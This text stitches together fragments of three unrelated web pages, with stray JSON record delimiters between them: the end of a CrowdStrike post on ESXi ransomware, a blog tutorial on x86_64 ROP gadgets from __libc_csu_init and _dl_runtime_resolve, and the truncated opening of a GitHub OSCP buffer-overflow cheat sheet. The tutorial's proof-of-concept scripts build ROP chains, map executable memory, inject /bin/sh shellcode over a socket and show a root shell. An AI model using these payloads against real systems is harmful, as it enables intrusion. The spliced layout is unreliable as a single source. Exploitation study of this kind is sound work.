[11]VMware\nat\n[12]https:\/\/docs.vmware.com\/en\/VMware-vSphere\/7.0\/com.vmware.vsphere.se\ncurity.doc\/GUID-B39474AF-6778-499A-B8AB-E973BE6D4899.html.\nConclusion\nCrowdStrike has observed a significant uptrend in eCrime campaigns\ntargeting VMware ESXi hypervisors with ransomware to maximize\nencryption impact across a victim environment. This targeting modus\noperandi is becoming prevalent, with adversaries developing and\ndeploying ESXi ransomware variants, and in some cases seeking\npartnership opportunities with other operators or access brokers.\nCrowdStrike recommends that organizations review their ESXi security\nposture and implement the specific defensive controls outlined in this\nblog to protect these critical assets.\nAdditional Resources\n* To learn more about eCrime adversaries tracked by CrowdStrike\nIntelligence, visit the [13]CrowdStrike Adversary Universe.\n* To find out how to incorporate intelligence on threat actors into\nyour security strategy, visit the [14]CROWDSTRIKE FALCON\u00ae\nINTELLIGENCE\u2122 Threat Intelligence page.\n* Learn about the powerful, cloud-native [15]CrowdStrike Falcon\u00ae\nplatform by visiting the product webpage.\n* [16]Get a full-featured free trial of CrowdStrike Falcon\u00ae Prevent\u2122\nto see for yourself how true next-gen AV performs against today\u2019s\nmost sophisticated threats.\n* [17]Tweet\n* [18]Share\nRelated Content\nCrowdStrike Services Offers Incident Response Executive Preparation Checklist\nBusiness as Usual: Falcon Complete MDR Thwarts Novel VANGUARD PANDA (Volt\nTyphoon) Tradecraft\nDiscovering the MOVEit Vulnerability with the CrowdStrike Falcon Platform\n[19]CARBON SPIDER Embraces Big Game Hunting, Part 1\n[20]The 5 Steps of Log Management: Essential Steps to Improve\nObservability, Enhance Security, and Monitor System and Application\nPerformance\n*\n*\n*\n*\n* Copyright \u00a9 2023 CrowdStrike\n* [21]Privacy\n* [22]Request Info\n* [23]Blog\n* [24]Contact Us\n* 1.888.512.8906"}
{"text":"#[1]voidsecurity - Atom [2]voidsecurity - RSS [3]voidsecurity - Atom\n[4]voidsecurity\nYet another blog by a security enthusiast !\nVulnerabilities\n* [5]Writeups\n* [6]List of Vulnerabilities\nMonday, July 29, 2013\nSome universal gadget sequence for Linux x86_64 ROP payload\nUnlike x86, x86_64 ROP payload needs the parameters to function call in\nregisters. __libc_csu_init functions provides a few nice gadgets to\nload data into certain critical registers. Most importantly EDI, RSI\nand RDX. This is the sample code:\n\/\/ gcc -O3 -o rop rop.c\n#include <unistd.h>\nint main(void) {\nchar buf[64];\nread(0, buf, 2048);\nreturn 0;\n}\nThe code was compiled with gcc 4.8.0. Looking into the binary we can\nsee the default functions\n_init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini\nBelow is the disassembly of __libc_csu_init\nDump of assembler code for function __libc_csu_init:\n0x0000000000401830 <+0>: mov    QWORD PTR [rsp-0x28],rbp\n0x0000000000401835 <+5>: mov    QWORD PTR [rsp-0x20],r12\n0x000000000040183a <+10>: lea    rbp,[rip+0x2007c7]        # 0x602008\n0x0000000000401841 <+17>: lea    r12,[rip+0x2007b8]        # 0x602000\n0x0000000000401848 <+24>: mov    QWORD PTR [rsp-0x30],rbx\n0x000000000040184d <+29>: mov    QWORD PTR [rsp-0x18],r13\n0x0000000000401852 <+34>: mov    QWORD PTR [rsp-0x10],r14\n0x0000000000401857 <+39>: mov    QWORD PTR [rsp-0x8],r15\n0x000000000040185c <+44>: sub    rsp,0x38\n0x0000000000401860 <+48>: sub    rbp,r12\n0x0000000000401863 <+51>: mov    r15d,edi\n0x0000000000401866 <+54>: mov    r14,rsi\n0x0000000000401869 <+57>: sar    rbp,0x3\n0x000000000040186d <+61>: mov    r13,rdx\n0x0000000000401870 <+64>: xor    ebx,ebx\n0x0000000000401872 <+66>: call   0x400708 <_init>\n0x0000000000401877 <+71>: test   rbp,rbp\n0x000000000040187a <+74>: je     0x401896 <__libc_csu_init+102>\n0x000000000040187c <+76>: nop    DWORD PTR [rax+0x0]\n0x0000000000401880 <+80>: mov    rdx,r13\n0x0000000000401883 <+83>: mov    rsi,r14\n0x0000000000401886 <+86>: mov    edi,r15d\n0x0000000000401889 <+89>: call   QWORD PTR [r12+rbx*8]\n0x000000000040188d <+93>: add    rbx,0x1\n0x0000000000401891 <+97>: cmp    rbx,rbp\n0x0000000000401894 <+100>: jne    0x401880 <__libc_csu_init+80>\n0x0000000000401896 <+102>: mov    rbx,QWORD PTR [rsp+0x8]\n0x000000000040189b <+107>: mov    rbp,QWORD PTR [rsp+0x10]\n0x00000000004018a0 <+112>: mov    r12,QWORD PTR [rsp+0x18]\n0x00000000004018a5 <+117>: mov    r13,QWORD PTR [rsp+0x20]\n0x00000000004018aa <+122>: mov    r14,QWORD PTR [rsp+0x28]\n0x00000000004018af <+127>: mov    r15,QWORD PTR [rsp+0x30]\n0x00000000004018b4 <+132>: add    rsp,0x38\n0x00000000004018b8 <+136>: ret\nControlling registers EDI and ESI:\nUnaligned instrutions right at the bottom of the __libc_csu_init\nprovides us with gadgets to load EDI and ESI\ngdb-peda$ x\/4i 0x00000000004018ab\n0x4018ab <__libc_csu_init+123>: mov    esi,DWORD PTR [rsp+0x28]\n0x4018af <__libc_csu_init+127>: mov    r15,QWORD PTR [rsp+0x30]\n0x4018b4 <__libc_csu_init+132>: add    rsp,0x38\n0x4018b8 <__libc_csu_init+136>: ret\ngdb-peda$ x\/3i 0x00000000004018b0\n0x4018b0 <__libc_csu_init+128>: mov    edi,DWORD PTR [rsp+0x30]\n0x4018b4 <__libc_csu_init+132>: add    rsp,0x38\n0x4018b8 <__libc_csu_init+136>: ret\nThese gadgets give us some control over EDI and ESI which makes up the\nfirst 2 parameters for making function call\nControlling registers EDI, RSI and RDX:\nThe 3rd parameter for function call is loaded into RDX, __libc_csu_init\nhas the gadget to load RDX, but there are few other things we have to\ncontrol\n0x0000000000401889 <+89>: call   QWORD PTR [r12+rbx*8]\n0x000000000040188d <+93>: add    rbx,0x1\n0x0000000000401891 <+97>: cmp    rbx,rbp\n0x0000000000401894 <+100>: jne    0x401880 <__libc_csu_init+80>\nTo effectively use mov rdx,r13 , we have to ensure that call QWORD PTR\n[r12+rbx*8] doesn't SIGSEGV, cmp rbx,rbp equals and most importantly\nvalue of RDX is not altered.\nIn _DYNAMIC variable ie. .dynamic section of executable we can find\npointers to _init and _fini section\ngdb-peda$ x\/10x &_DYNAMIC\n0x6006f0: 0x0000000000000001 0x0000000000000010\n0x600700: 0x000000000000000c 0x0000000000400378\n0x600710: 0x000000000000000d 0x0000000000400618\n0x600720: 0x0000000000000004 0x0000000000400240\n0x600730: 0x0000000000000005 0x00000000004002c8\ngdb-peda$ x\/i 0x0000000000400378\n0x400378 <_init>: sub    rsp,0x8\ngdb-peda$ x\/i 0x0000000000400618\n0x400618 <_fini>: sub    rsp,0x8\ngdb-peda$ x\/gx 0x600718\n0x600718: 0x0000000000400618\nWe can make call QWORD PTR [r12+rbx*8] point to 0x600718, so that _fini\nis called. This is what _fini looks like\ngdb-peda$ disass _fini\nDump of assembler code for function _fini:\n0x0000000000400618 <+0>: sub    rsp,0x8\n0x000000000040061c <+4>: call   0x400480 <__do_global_dtors_aux>\n0x0000000000400621 <+9>: add    rsp,0x8\n0x0000000000400625 <+13>: ret\nEnd of assembler dump.\n_fini function and subsequent functions called from _fini doesn't\ndisturb the state of RDX register and RBX value is preserved. Below is\nthe POC:\n#!\/usr\/bin\/env python\nimport struct\npayload  = \"A\" * 72\npayload += struct.pack(\"<Q\", 0x00000000004005b6)\n# mov rbx,QWORD PTR [rsp+0x08]; mov rbp,QWORD PTR [rsp+0x10]; mov r12,QWORD PTR\n[rsp+0x18] ;\n# mov r13,QWORD PTR [rsp+0x20]; mov r14,QWORD PTR [rsp+0x28]; mov r15,QWORD PTR\n[rsp+0x30] ; add rsp,0x38 ; ret\npayload += \"A\" * 8\n# Adjust Offset & Address such that 0x0a is avoided & call QWORD PTR [r12+rbx*8]\npoints to _fini\npayload += struct.pack(\"<Q\", 0x0)        # Offset of pointer to _fini function i\nn RBX\npayload += struct.pack(\"<Q\", 0x1)        # To pass cmp rbx,rbp check in RBP\npayload += struct.pack(\"<Q\", 0x600718)   # address in R12\npayload += \"B\"*8       # Value for EDI register\npayload += \"C\"*8       # Value for RSI register\npayload += \"D\"*8       # Value for RDX register\npayload += struct.pack(\"<Q\", 0x00000000004005a0)\n# mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]; add rbx,0x\n1; cmp rbx,rbp; jb 0x4005a0 <__libc_csu_init+80>\n# mov rbx,QWORD PTR [rsp+0x08]; mov rbp,QWORD PTR [rsp+0x10]; mov r12,QWORD PTR\n[rsp+0x18] ;\n# mov r13,QWORD PTR [rsp+0x20]; mov r14,QWORD PTR [rsp+0x28]; mov r15,QWORD PTR\n[rsp+0x30] ; add rsp,0x38 ; ret\npayload += \"E\"*56\npayload += struct.pack(\"<Q\", 0xdeadbeef)\nprint payload\nRunning the exploit we get\ngdb-peda$ info registers\nrax            0x7 0x7\nrbx            0x4545454545454545 0x4545454545454545\nrcx            0x38b7ad41d0 0x38b7ad41d0\nrdx            0x4444444444444444 0x4444444444444444\nrsi            0x4343434343434343 0x4343434343434343\nrdi            0x42424242 0x42424242\nrbp            0x4545454545454545 0x4545454545454545\nrsp            0x7fffbbd90350 0x7fffbbd90350\nr8             0x38b7d7a300 0x38b7d7a300\nr9             0x38b720e8e0 0x38b720e8e0\nr10            0x7fffbbd90000 0x7fffbbd90000\nr11            0x246 0x246\nr12            0x4545454545454545 0x4545454545454545\nr13            0x4545454545454545 0x4545454545454545\nr14            0x4545454545454545 0x4545454545454545\nr15            0x4545454545454545 0x4545454545454545\nrip            0xdeadbeef 0xdeadbeef\neflags         0x10206 [ PF IF RF ]\ncs             0x33 0x33\nss             0x2b 0x2b\nds             0x0 0x0\nes             0x0 0x0\nfs             0x0 0x0\ngs             0x0 0x0\ngdb-peda$ x\/i $rip\n=> 0xdeadbeef: Cannot access memory at address 0xdeadbeef\nWe can see that EDI, RSI and RDX are loaded with user controlled data.\nOne can also make call QWORD PTR [r12+rbx*8] point to GOT address of\nfunctions instead of _fini, as per requirement.\nStack Shifting gadget:\nAnother important gadget that __libc_csu_init provides is pop rsp. This\ncan be used to shift stack to desired location, say .bss\/.data section\ngdb-peda$ x\/9i 0x0000000000401898\n0x401898 <__libc_csu_init+104>: pop    rsp\n0x401899 <__libc_csu_init+105>: and    al,0x8\n0x40189b <__libc_csu_init+107>: mov    rbp,QWORD PTR [rsp+0x10]\n0x4018a0 <__libc_csu_init+112>: mov    r12,QWORD PTR [rsp+0x18]\n0x4018a5 <__libc_csu_init+117>: mov    r13,QWORD PTR [rsp+0x20]\n0x4018aa <__libc_csu_init+122>: mov    r14,QWORD PTR [rsp+0x28]\n0x4018af <__libc_csu_init+127>: mov    r15,QWORD PTR [rsp+0x30]\n0x4018b4 <__libc_csu_init+132>: add    rsp,0x38\n0x4018b8 <__libc_csu_init+136>: ret\nDereference with respect to RSP:\nThis gadget might be useful to work with function pointers in stack\ngdb-peda$ x\/16i 0x40188a\n0x40188a <__libc_csu_init+90>: call   QWORD PTR [rsp+rbx*8]\n0x40188d <__libc_csu_init+93>: add    rbx,0x1\n0x401891 <__libc_csu_init+97>: cmp    rbx,rbp\n0x401894 <__libc_csu_init+100>: jne    0x401880 <__libc_csu_init+80>\n0x401896 <__libc_csu_init+102>: mov    rbx,QWORD PTR [rsp+0x8]\n0x40189b <__libc_csu_init+107>: mov    rbp,QWORD PTR [rsp+0x10]\n0x4018a0 <__libc_csu_init+112>: mov    r12,QWORD PTR [rsp+0x18]\n0x4018a5 <__libc_csu_init+117>: mov    r13,QWORD PTR [rsp+0x20]\n0x4018aa <__libc_csu_init+122>: mov    r14,QWORD PTR [rsp+0x28]\n0x4018af <__libc_csu_init+127>: mov    r15,QWORD PTR [rsp+0x30]\n0x4018b4 <__libc_csu_init+132>: add    rsp,0x38\n0x4018b8 <__libc_csu_init+136>: ret\nChaining Gadgets from Linker:\n_dl_runtime_resolve function in dynamic linker has the following\nsequnce of instructions\n0x38b7214780 <_dl_runtime_resolve>:    sub    rsp,0x38\n0x38b7214784 <_dl_runtime_resolve+4>:  mov    QWORD PTR [rsp],rax\n0x38b7214788 <_dl_runtime_resolve+8>:  mov    QWORD PTR [rsp+0x8],rcx\n0x38b721478d <_dl_runtime_resolve+13>: mov    QWORD PTR [rsp+0x10],rdx\n0x38b7214792 <_dl_runtime_resolve+18>: mov    QWORD PTR [rsp+0x18],rsi\n0x38b7214797 <_dl_runtime_resolve+23>: mov    QWORD PTR [rsp+0x20],rdi\n0x38b721479c <_dl_runtime_resolve+28>: mov    QWORD PTR [rsp+0x28],r8\n0x38b72147a1 <_dl_runtime_resolve+33>: mov    QWORD PTR [rsp+0x30],r9\n0x38b72147a6 <_dl_runtime_resolve+38>: mov    rsi,QWORD PTR [rsp+0x40]\n0x38b72147ab <_dl_runtime_resolve+43>: mov    rdi,QWORD PTR [rsp+0x38]\n0x38b72147b0 <_dl_runtime_resolve+48>: call   0x38b720de00 <_dl_fixup>\n0x38b72147b5 <_dl_runtime_resolve+53>: mov    r11,rax    @ 0x35\n0x38b72147b8 <_dl_runtime_resolve+56>: mov    r9,QWORD PTR [rsp+0x30]\n0x38b72147bd <_dl_runtime_resolve+61>: mov    r8,QWORD PTR [rsp+0x28]\n0x38b72147c2 <_dl_runtime_resolve+66>: mov    rdi,QWORD PTR [rsp+0x20]\n0x38b72147c7 <_dl_runtime_resolve+71>: mov    rsi,QWORD PTR [rsp+0x18]\n0x38b72147cc <_dl_runtime_resolve+76>: mov    rdx,QWORD PTR [rsp+0x10]\n0x38b72147d1 <_dl_runtime_resolve+81>: mov    rcx,QWORD PTR [rsp+0x8]\n0x38b72147d6 <_dl_runtime_resolve+86>: mov    rax,QWORD PTR [rsp]\n0x38b72147da <_dl_runtime_resolve+90>: add    rsp,0x48\n0x38b72147de <_dl_runtime_resolve+94>: jmp    r11\ngdb-peda$ disass read\nDump of assembler code for function read@plt:\n0x00000000004003e8 <+0>: jmp    QWORD PTR [rip+0x20056a]  # 0x600958 <read@go\nt.plt>\n0x00000000004003ee <+6>: push   0x1\n0x00000000004003f3 <+11>: jmp    0x4003c8    # PLT [0]\nEnd of assembler dump.\nPLT [0] code:\ngdb-peda$ x\/3i 0x4003c8\n0x4003c8: push   QWORD PTR [rip+0x200572]   # 0x600940\n0x4003ce: jmp    QWORD PTR [rip+0x200574]   # 0x600948, GOT entry ie PLTGOT+1\n6\n0x4003d4: nop    DWORD PTR [rax+0x0]\ngdb-peda$ x\/x 0x600948\n0x600948: 0x00000000\ngdb-peda$ break *main\nBreakpoint 1 at 0x400578\ngdb-peda$ run\ngdb-peda$ x\/x 0x600948\n0x600948: 0x00000038b7214780      # address of _dl_runtime_resolve\nThe code at 0x4003c8 which is PLT[0] calls _dl_runtime_resolve in\ndynamic linker to resolve the address of libc functions during runtime.\nIf one can leak the address of _dl_runtime_resolve by reading the GOT\nentry, the interesting gadget sequence is located at offset 0x35, from\nthe leaked address\n0x38b72147b5 <_dl_runtime_resolve+53>: mov    r11,rax    @ 0x35 + GOT\n0x38b72147b8 <_dl_runtime_resolve+56>: mov    r9,QWORD PTR [rsp+0x30]\n0x38b72147bd <_dl_runtime_resolve+61>: mov    r8,QWORD PTR [rsp+0x28]\n0x38b72147c2 <_dl_runtime_resolve+66>: mov    rdi,QWORD PTR [rsp+0x20]\n0x38b72147c7 <_dl_runtime_resolve+71>: mov    rsi,QWORD PTR [rsp+0x18]\n0x38b72147cc <_dl_runtime_resolve+76>: mov    rdx,QWORD PTR [rsp+0x10]\n0x38b72147d1 <_dl_runtime_resolve+81>: mov    rcx,QWORD PTR [rsp+0x8]\n0x38b72147d6 <_dl_runtime_resolve+86>: mov    rax,QWORD PTR [rsp]\n0x38b72147da <_dl_runtime_resolve+90>: add    rsp,0x48\n0x38b72147de <_dl_runtime_resolve+94>: jmp    r11\nIf register RAX can be loaded with user controlled value, the above\ngadget sequence can be used to call any functions as it can populate\nall necessary registers. Here is a simple POC exploit for a dummy code,\nASLR was disabled for testing, but we need some info leak when ASLR is\nenabled\n#!\/usr\/bin\/env python\n#   GADGET\n#   0x38b72147b5 <_dl_runtime_resolve+53>: mov    r11,rax    @ 0x35 from GOT use\nd for PLT[0], leaked address\n#   0x38b72147b8 <_dl_runtime_resolve+56>: mov    r9,QWORD PTR [rsp+0x30]\n#   0x38b72147bd <_dl_runtime_resolve+61>: mov    r8,QWORD PTR [rsp+0x28]\n#   0x38b72147c2 <_dl_runtime_resolve+66>: mov    rdi,QWORD PTR [rsp+0x20]\n#   0x38b72147c7 <_dl_runtime_resolve+71>: mov    rsi,QWORD PTR [rsp+0x18]\n#   0x38b72147cc <_dl_runtime_resolve+76>: mov    rdx,QWORD PTR [rsp+0x10]\n#   0x38b72147d1 <_dl_runtime_resolve+81>: mov    rcx,QWORD PTR [rsp+0x8]\n#   0x38b72147d6 <_dl_runtime_resolve+86>: mov    rax,QWORD PTR [rsp]\n#   0x38b72147da <_dl_runtime_resolve+90>: add    rsp,0x48\n#   0x38b72147de <_dl_runtime_resolve+94>: jmp    r11\nimport struct\nimport socket\nimport time\nip = \"127.0.0.1\"\nport = 3337\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsoc.connect((ip, port))\nshellcode = ( \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\" +\n\"\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\" +\n\"\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" )\npayload  = \"A\" * 72\n# call mmap\npayload += struct.pack(\"<Q\", 0x00400574)     # pop rax\npayload += struct.pack(\"<Q\", 0x38b7addfd0 )  # address of mmap@libc\npayload += struct.pack(\"<Q\", 0x38b72147b5 )  # gadget from linker\npayload += \"ANYTHING\"                           # For RAX\npayload += struct.pack(\"<Q\", 34 )            # For RCX, 4th param\npayload += struct.pack(\"<Q\", 7 )             # For RDX, 3rd param\npayload += struct.pack(\"<Q\", 1024 )          # For RSI, 2nd param\npayload += struct.pack(\"<Q\", 0x0badc000 )    # For RDI, 1st param\npayload += struct.pack(\"<Q\", 0 )             # For R8,  5th param\npayload += struct.pack(\"<Q\", 0 )             # For R9,  6th param\npayload += \"MOVEMOVE\"\npayload += \"MOVEMOVE\"\npayload += struct.pack(\"<Q\", 0x00400574)     # pop rax\npayload += struct.pack(\"<Q\", 0x004003e8 )    # For RAX, read@PLT\n# call read\npayload += struct.pack(\"<Q\", 0x38b72147b5 )  # gadget from linker\npayload += \"ANYTHING\"                           # For RAX\npayload += \"ANYTHING\"                           # For RCX, 4th param\npayload += struct.pack(\"<Q\", 1024 )          # For RDX, 3rd param\npayload += struct.pack(\"<Q\", 0x0badc000 )    # For RSI, 2nd param\npayload += struct.pack(\"<Q\", 0 )             # For RDI, 1st param, stdin\npayload += \"ANYTHING\"                           # For R8,  5th param\npayload += \"ANYTHING\"                           # For R9,  6th param\npayload += \"MOVEMOVE\"\npayload += \"MOVEMOVE\"\npayload += struct.pack(\"<Q\", 0x0badc000 )    # jump to shellcode\nsoc.send(payload + \"\\n\")\ntime.sleep(1)\nsoc.send(shellcode + \"\\n\")\nsoc.send(\"id\\n\")\nprint soc.recv(1024)\n[ctf@renorobert ret2linker]$ python exploit.py\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10\n(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\nWill update post when I find more info.\nPosted by [7]Reno Robert at [8]1:32\u202fPM\n[9]Email This [10]BlogThis! [11]Share to Twitter [12]Share to Facebook\nLabels: [13]Exploitation , [14]ROP\nNo comments :\nPost a Comment\n[15]Newer Post [16]Older Post [17]Home\nSubscribe to: [18]Post Comments ( Atom )\nAbout Me\n[19]My Photo\n[20]Reno Robert\n[21]View my complete profile\n[22]Follow @renorobertr\nBlog Archive\n* [23]\u25ba  [24]2019\n+ [25]\u25ba  [26]January\n* [27]\u25ba  [28]2018\n+ [29]\u25ba  [30]November\n+ [31]\u25ba  [32]August\n* [33]\u25ba  [34]2017\n+ [35]\u25ba  [36]July\n* [37]\u25ba  [38]2016\n+ [39]\u25ba  [40]April\n+ [41]\u25ba  [42]February\n* [43]\u25ba  [44]2015\n+ [45]\u25ba  [46]December\n+ [47]\u25ba  [48]October\n+ [49]\u25ba  [50]September\n+ [51]\u25ba  [52]July\n+ [53]\u25ba  [54]June\n+ [55]\u25ba  [56]April\n+ [57]\u25ba  [58]February\n+ [59]\u25ba  [60]January\n* [61]\u25ba  [62]2014\n+ [63]\u25ba  [64]December\n+ [65]\u25ba  [66]October\n+ [67]\u25ba  [68]September\n+ [69]\u25ba  [70]August\n+ [71]\u25ba  [72]July\n+ [73]\u25ba  [74]May\n+ [75]\u25ba  [76]March\n+ [77]\u25ba  [78]February\n+ [79]\u25ba  [80]January\n* [81]\u25bc  [82]2013\n+ [83]\u25ba  [84]December\n+ [85]\u25ba  [86]November\n+ [87]\u25ba  [88]October\n+ [89]\u25ba  [90]September\n+ [91]\u25ba  [92]August\n+ [93]\u25bc  [94]July\no [95]Some universal gadget sequence for Linux x86_64 RO...\no [96]UFO CTF 2013 - pwn 100 - ufobay - [Team xbios]\no [97]DIMVA CTF 2013 - pwn 200 - [Team xbios]\no [98]DIMVA CTF 2013 - pwn 100 - [Team xbios]\no [99]SIGINT CTF - crypto 200 - RSA - [Team xbios]\no [100]SIGINT CTF - pwning 100 - baremetal - [Team xbios]\n+ [101]\u25ba  [102]June\n+ [103]\u25ba  [104]May\n+ [105]\u25ba  [106]April\n+ [107]\u25ba  [108]March\n+ [109]\u25ba  [110]February\n+ [111]\u25ba  [112]January\n* [113]\u25ba  [114]2012\n+ [115]\u25ba  [116]December\n+ [117]\u25ba  [118]November\n+ [119]\u25ba  [120]October\n+ [121]\u25ba  [122]September\nLabels\n* [123]Exploitation\n* [124]Crypto\n* [125]2014\n* [126]Reverse\n* [127]2015\n* [128]Exploit Exercise\n* [129]ROP\n* [130]Hackim\n* [131]CSAW15\n* [132]Hack You CTF\n* [133]Cscamp CTF Quals\n* [134]2016\n* [135]Boston Key Party CTF\n* [136]Codegate CTF\n* [137]Hack You Too CTF\n* [138]Plaid CTF\n* [139]RSA\n* [140]Bug\n* [141]EB CTF\n* [142]Volga CTF\n* [143]32C3 CTF\n* [144]DIMVA CTF\n* [145]Defcon\n* [146]InCTF\n* [147]PoliCTF\n* [148]Pwnium CTF\n* [149]SIGINT CTF\n* [150]UAF\n* [151]2018\n* [152]29C3 CTF\n* [153]AES\n* [154]Backdoor CTF\n* [155]Balt CTF\n* [156]CSAW CTF\n* [157]ForbiddenBITS CTF\n* [158]GITS CTF\n* [159]Information Leak\n* [160]KVM\n* [161]Knapsack\n* [162]RuCTF Quals\n* [163]UFO CTF\n* [164]VM escape\n* [165]Web\nPopular Posts\n* [166]Exploit Exercise - Orphan Process and Race Condition\nLets see how to solve level [19] in Nebula. The code given checks\nwhether its parent process is root using \/proc entry. int mai...\n* [167]From Compiler Optimization to Code Execution - VirtualBox VM\nEscape - CVE-2018-2844\nOracle fixed some of the issues I reported in VirtualBox during the\nOracle Critical Patch Update - April 2018. CVE-2018-2844 was an\ninter...\n* [168]Exploit Exercise - Python Pickles\nLevel [ 17 ] in nebula is pretty straight forward. The first look\nof it reveals the use of python's potentially vulnerable fun...\n* [169]Return to VDSO using ELF Auxiliary Vectors\nThis post is about exploiting a minimal binary without SigReturn\nOriented Programming (SROP). Below is demo code, thanks to my\nfrie...\n* [170]Defeating anti-debugging techniques using IDA and x86 emulator\nplugin\nRecently I was trying to reverse a small crackme by Tosh. The\nchallenge was to find a password by reversing the binary, bypassing\n...\n* [171]VirtualBox NAT DHCP\/BOOTP server vulnerabilities\nContinuing from my previous blog posts, this is another old set of\nVirtualBox bugs which can lead to VM escape. VirtualBox guest in\nNAT m...\n* [172]Exploiting PHP Bug #66550 - SQLite prepared statement\nuse-after-free - [A local PHP exploit]\nAs the title says, this bug is useful only for post exploitation to\nbypass protections when the attacker already has arbitrary PHP...\n* [173]Data Structure Recovery using PIN and PyGraphviz\nThis is a simple POC PIN tool to recover data structures in\ndynamically linked stripped executables, mainly for analyzing small\npr...\n* [174]Plaid CTF 2016 - Fixedpoint\nThe binary simply reads integers from user, performs floating point\noperations on it and stores it in a mmap'ed region with RW...\n* [175]Revisiting Defcon CTF Shitsco Use-After-Free Vulnerability -\nRemote Code Execution\nDefcon Quals 2014 Shitsco was an interesting challenge. There were\ntwo vulnerability in the binary - strcmp information leak and ...\nFollowers\nPowered by [176]Blogger."}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]V1n1v131r4 \/ [31]OSCP-Buffer-Overflow Public\n* [32]Notifications\n* [33]Fork 48\n* [34]Star 171 (BUTTON)\nOSCP Buffer Overflow cheat sheet\n[35]171 stars [36]48 forks [37]Activity\n[38]Star (BUTTON)\n[39]Notifications\n* [40]Code\n* [41]Issues 0\n* [42]Pull requests 0\n* [43]Actions\n* [44]Projects 0\n* [45]Security\n* [46]Insights\n(BUTTON) Additional navigation options\n* [47]Code\n* [48]Issues\n* [49]Pull requests\n* [50]Actions\n* [51]Projects\n* [52]Security\n* [53]Insights\nV1n1v131r4\/OSCP-Buffer-Overflow\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nmaster\nSwitch branches\/tags (BUTTON)\n____________________\n(BUTTON) Branches (BUTTON) Tags\nCould not load branches\nNothing to show\n[54]{{ refName }} default\n[55]View all branches\nCould not load tags\nNothing to show\n[56]{{ refName }} default\n[57]View all tags\nName already in use\n(BUTTON)\nA tag already exists with the provided branch name. Many Git commands\naccept both tag and branch names, so creating this branch may cause\nunexpected behavior. Are you sure you want to create this branch?\n(BUTTON) Cancel (BUTTON) Create\n[58]1 branch [59]0 tags\nCode\n* (BUTTON) Local\n* (BUTTON) Codespaces\n* Clone\n(button) HTTPS (button) GitHub CLI\nhttps:\/\/github.com\/V\nUse Git or checkout with SVN using the web URL.\ngh repo clone V1n1v1\nWork fast with our official CLI. [60]Learn more about the CLI.\n* [61]Open with GitHub Desktop\n* [62]Download ZIP\nSign In Required\nPlease [63]sign in to use Codespaces.\nLaunching GitHub Desktop\nIf nothing happens, [64]download GitHub Desktop and try again.\n(BUTTON)\nLaunching GitHub Desktop\nIf nothing happens, [65]download GitHub Desktop and try again.\n(BUTTON)\nLaunching Xcode\nIf nothing happens, [66]download Xcode and try again.\n(BUTTON)\nLaunching Visual Studio Code\nYour codespace will open once ready.\nThere was a problem preparing your codespace, please try again.\nLatest commit\nGit stats\n* [67]16 commits\nFiles\n[68]Permalink\nFailed to load latest commit information.\nType\nName\nLatest commit message\nCommit time\n[69]README.md\n[70]badchars.py\n[71]connect.py\n[72]exploit.py\n[73]fuzzing.py\n[74]offset.py\n[75]poc.py\n(BUTTON) View code\n[76]OSCP Buffer Overflow Cheat Sheet [77]Fuzzing [78]Offset\n[79]Badchars [80]JMP ESP [81]Exploit time\n[82]README.md\nOSCP Buffer Overflow Cheat Sheet\nIn this cheat sheet we will use dostackbufferoverflowgod as a\nvulnerable application in our exploration process (more info here:\n[83]https:\/\/github.com\/justinsteven\/dostackbufferoverflowgood).\nThe binary can be downloaded here:\n[84]https:\/\/github.com\/justinsteven\/dostackbufferoverflowgood\/blob\/mast\ner\/dostackbufferoverflowgood.exe\nBelow are the download links for all the tools needed for the study:\n* Windows 7 Evaluation:\n[85]https:\/\/gist.github.com\/anonymous\/c644cac9d77e2793742c13cf10d26\ncb8 (you can run on Windows 10 too)\n* Immunity Debugger:\n[86]https:\/\/www.immunityinc.com\/products\/debugger\/\n* Mona.py: [87]https:\/\/github.com\/corelan\/mona\nAll installation processes are described in the links 